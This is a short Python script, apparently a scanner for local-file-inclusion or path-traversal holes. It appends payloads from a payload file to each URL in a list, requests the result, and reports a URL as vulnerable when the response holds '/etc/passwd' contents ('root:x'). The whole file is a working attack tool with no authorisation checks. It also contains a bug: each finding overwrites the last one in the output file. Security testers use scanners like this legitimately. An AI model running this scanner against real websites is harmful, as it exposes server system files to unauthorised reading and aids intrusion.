import requests

def vuln_file(f_name):
    v_file = input("Enter a filename , if vuln occur it will append all vuln url in to that file :")
    f = open(f_name, "r")
    urls = f.readlines()

    file = open('payload.txt','r')
    payloads = file.readlines()
    for url in urls:
        url = url.strip()  
        for payload in payloads:
            payload = payload.strip() 
            
            full_url = f"{url}{payload}"
            try:
               
                response = requests.get(full_url)

                if response.status_code == 200 and "root:x" in response.text:
                    print(f"[!] Vulnerable URL found: {full_url}")
                    with open(v_file,'w') as url_file:
                        url_file.write(full_url)
                else:
                    print(f"[-] No vulnerability found at: {full_url}")
                    

            except requests.exceptions.RequestException as e:
                print(f"[!] Error accessing {full_url}: {e}")